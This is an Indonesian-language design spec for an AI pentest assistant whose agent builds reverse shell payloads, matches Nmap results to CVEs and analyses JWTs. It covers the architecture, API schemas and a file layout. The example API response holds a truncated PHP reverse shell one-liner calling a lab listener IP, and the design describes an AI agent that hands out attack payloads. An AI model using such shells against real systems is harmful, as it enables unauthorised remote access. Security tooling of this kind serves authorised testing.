# PayloadHub-AI — Spesifikasi Teknis & Blueprint Kode

> **Principal Software Architect & Senior Cybersecurity Engineer — Technical Specification**
> Asisten otonom penetrasi keamanan (ethical hacking) berbasis *Deterministic Tool Calling*.

---

## 1. Ringkasan Sistem

PayloadHub-AI adalah asisten yang menerima **konteks masalah** (IP target, OS, constraint karakter, hasil scan Nmap/JWT), lalu secara logis dan otomatis memanggil **function internal terverifikasi** (Tool Calling) untuk:

1. Merakit *reverse shell payload* secara **deterministik** (tanpa sintaks karangan LLM).
2. Memetakan service + versi hasil Nmap ke referensi **CVE**.
3. Menganalisis token **JWT** (header/payload, deteksi `alg: none` / `HS256`).

### Prinsip Keamanan (Strict Rules)

| # | Rule | Implementasi |
|---|------|--------------|
| 1 | No dummy / placeholder code | Semua fungsi punya implementasi produksi nyata |
| 2 | Deterministic Tool Calling | LLM **hanya** memilih & memanggil tool; sintaks payload berasal dari library internal (`_REVERSE_SHELL_LIBRARY`) |
| 3 | Sanitasi & validasi input | Regex IPv4 ketat, port `1..65535`, sanitasi string di layer FastAPI (`models.py`) sebelum masuk LLM |
| 4 | Zero knowledge on device | API key & LHOST/LPORT default disimpan via `flutter_secure_storage` (Android Keystore) |

---

## 2. Arsitektur & Data Flow

### 2.1 Komponen

```
┌─────────────────────────────┐        ┌──────────────────────────────────────────┐
│  Flutter (Android)          │        │  FastAPI + LangChain/CrewAI (Python)     │
│  Clean Architecture         │        │  Agentic Architecture                    │
│                             │        │                                          │
│  Presentation               │  HTTP  │  API Layer (Pydantic Validation)         │
│  ├ PayloadChatScreen        │ ─────► │  ├ /api/v1/agent/execute                 │
│  ├ ChatStateNotifier        │  POST  │  │  └ 400 / 500 error handling           │
│  Domain                     │ ◄───── │  Agent Orchestrator                      │
│  ├ ChatMessage (entity)     │  JSON  │  ├ System Prompt (anti-halusinasi)       │
│  ├ PayloadRepository (abs)  │        │  ├ LLM Function-Calling Router            │
│  Data                       │        │  Tool Pipeline (Deterministic)           │
│  ├ PayloadRepositoryImpl    │        │  ├ generate_reverse_shell_tool           │
│  ├ DioClient (interceptor)  │        │  ├ parse_nmap_cve_tool                   │
│  Services                   │        │  └ jwt_analyzer_tool                     │
│  └ SecureStorageService     │        └──────────────────────────────────────────┘
└─────────────────────────────┘
```

### 2.2 Sequence Diagram (Text)

```
User                 Flutter                     FastAPI                     LLM Agent                    Tools
 │                       │                            │                            │                          │
 │  ketik prompt          │                            │                            │                          │
 │ ────────────────────►  │                            │                            │                          │
 │                       │ ChatStateNotifier.send()    │                            │                          │
 │                       │   → ChatLoading              │                            │                          │
 │                       │ POST /api/v1/agent/execute  │                            │                          │
 │                       │ ─────────────────────────►  │                            │                          │
 │                       │                            │ 1) Validasi Pydantic        │                            │
 │                       │                            │    (IPv4 regex, port,       │                            │
 │                       │                            │     sanitasi string)        │                            │
 │                       │                            │    ── if invalid ──► 400    │                            │
 │                       │                            │ 2) Build prompt + konteks   │                            │
 │                       │                            │ ─────────────────────────►  │                            │
 │                       │                            │                            │ 3) Reasoning (plan)       │
 │                       │                            │                            │    pilih tool + args      │
 │                       │                            │                            │ ───────────────────────►  │
 │                       │                            │                            │                           │ 4) Deterministic exec
 │                       │                            │                            │ ◄───────────────────────  │    (payload dari library)
 │                       │                            │                            │ 5) observe result         │
 │                       │                            │                            │    (boleh loop tool lagi)  │
 │                       │                            │ ◄─────────────────────────  │    final answer (no fabricate)
 │                       │                            │ 6) Format AgentResponse      │                            │
 │                       │                            │    (extract code blocks,     │                            │
 │                       │                            │     tools_used)              │                            │
 │                       │ ◄─────────────────────────  │                            │                            │
 │                       │ ChatSuccess / ChatError     │                            │                            │
 │                       │   → parse code blocks       │                            │                            │
 │ ◄────────────────────  │   → HighlightView + Copy   │                            │                            │
 │  render UI (code hl)   │                            │                            │                            │
```

---

## 3. Kontrak API (JSON Schema)

### 3.1 Request — `POST /api/v1/agent/execute`

```json
{
  "prompt": "Generate a PHP reverse shell for target 10.10.14.8, listener port 9001",
  "session_id": "3f9c1b2e-4a5d-4c6e-8f7a-1b2c3d4e5f6a",
  "context": {
    "lhost": "10.10.14.8",
    "lport": 9001,
    "target": "10.129.3.14",
    "target_os": "linux",
    "scan_data": "22/tcp open ssh OpenSSH 7.2p2\n80/tcp open http Apache httpd 2.4.49"
  }
}
```

| Field | Tipe | Validasi |
|-------|------|----------|
| `prompt` | string | wajib, 1..4000 char, disanitasi |
| `session_id` | string (UUID) | opsional; di-generate jika kosong |
| `context.lhost` | string | opsional; regex IPv4 ketat |
| `context.lport` | int | opsional; 1..65535 |
| `context.target` | string | opsional; disanitasi |
| `context.target_os` | string | opsional; enum `linux`/`windows`/`unknown` |
| `context.scan_data` | string | opsional; disanitasi (jaga newline) |

### 3.2 Response — `200 OK`

```json
{
  "status": "success",
  "session_id": "3f9c1b2e-4a5d-4c6e-8f7a-1b2c3d4e5f6a",
  "response": "Berikut payload reverse shell PHP untuk 10.10.14.8:9001.",
  "code_blocks": [
    {
      "language": "php",
      "code": "php -r '$sock=fsockopen(\"10.10.14.8\",9001);...'",
      "payload_type": "reverse_shell"
    }
  ],
  "tools_used": ["generate_reverse_shell_tool"],
  "elapsed_ms": 1842
}
```

### 3.3 Error Response — `400 / 500`

```json
{
  "status": "error",
  "detail": [
    {
      "loc": ["body", "context", "lhost"],
      "msg": "value is not a valid IPv4 address",
      "type": "value_error"
    }
  ]
}
```

| Status | Pemicu |
|--------|--------|
| 400 | Validasi Pydantic gagal (IP/port/string) — `RequestValidationError` |
| 500 | Internal agent error (LLM timeout, tool exception, dsb.) |

---

## 4. Struktur Direktori

```
projectflutter/
├── BLUEPRINT.md
├── backend/
│   ├── app/
│   │   ├── __init__.py
│   │   ├── config.py          # Settings (env)
│   │   ├── models.py          # Pydantic models + validators
│   │   ├── tools.py           # 3 deterministic @tool functions
│   │   ├── agent.py           # LangChain agent + system prompt
│   │   └── main.py            # FastAPI app + endpoint
│   ├── requirements.txt
│   └── .env.example
└── frontend/
    ├── pubspec.yaml
    └── lib/
        ├── main.dart
        ├── core/
        │   ├── network/dio_client.dart
        │   ├── error/app_exception.dart
        │   └── utils/validators.dart
        ├── services/
        │   └── secure_storage_service.dart
        └── features/
            └── payload_chat/
                ├── domain/
                │   ├── entities/chat_message.dart
                │   └── repositories/payload_repository.dart
                ├── data/
                │   ├── models/agent_request.dart
                │   ├── models/agent_response.dart
                │   └── payload_repository_impl.dart
                └── presentation/
                    ├── notifier/chat_state.dart
                    ├── notifier/chat_state_notifier.dart
                    ├── notifier/chat_providers.dart
                    ├── payload_chat_screen.dart
                    └── widgets/code_block_view.dart
```

---

## 5. Aturan Determinisme & Anti-Halusinasi

1. **Library payload statis** — `tools.py` menyimpan template payload di `_REVERSE_SHELL_LIBRARY`. LLM tidak pernah menulis payload; ia hanya memilih `shell_type` + `encoding` + argumen.
2. **System prompt** (`agent.py`) secara eksplisit melarang agen: menciptakan sintaks baru, memuat CVE fiktif, atau menjawab di luar data tool.
3. **Temperature = 0** pada LLM untuk hasil deterministik.
4. **Validasi ganda** — setiap tool memvalidasi ulang argumennya (IP/port) sebelum dieksekusi, sebagai pertahanan berlapis di luar Pydantic.

---

## 6. Catatan Keamanan Operasional

- API key LLM **tidak pernah** dikirim ke klien; disimpan di env server (`LLM_API_KEY`).
- Klien hanya menyimpan `llm_api_key` (untuk mode bring-your-own-key) & default LHOST secara terenkripsi.
- Backend harus dibatasi aksesnya (rate-limit + autentikasi) bila di-deploy publik.
- Penggunaan aplikasi hanya untuk **tes penetrasi yang sah** (scope resmi / CTF / lab).
